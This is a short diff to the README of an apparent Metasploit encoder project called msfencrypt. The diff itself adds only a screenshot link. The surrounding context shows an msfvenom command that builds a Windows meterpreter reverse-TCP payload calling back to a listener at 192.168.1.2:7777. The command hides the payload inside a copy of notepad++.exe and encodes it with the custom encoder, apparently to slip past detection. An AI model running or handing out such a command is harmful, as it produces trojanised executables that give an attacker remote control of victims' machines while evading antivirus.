@@ -13,3 +13,5 @@ Copy msfencrypt.rb in metasploit/modules/encoders/x86/
 -----------
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=7777 -f raw -x notepad++.exe -f exe-only -e x86/msfencrypt -o output.exe
+
+![alt tag](https://github.com/MrMugiwara/Metasploit-Encrypter/blob/master/msfencrypt.png)
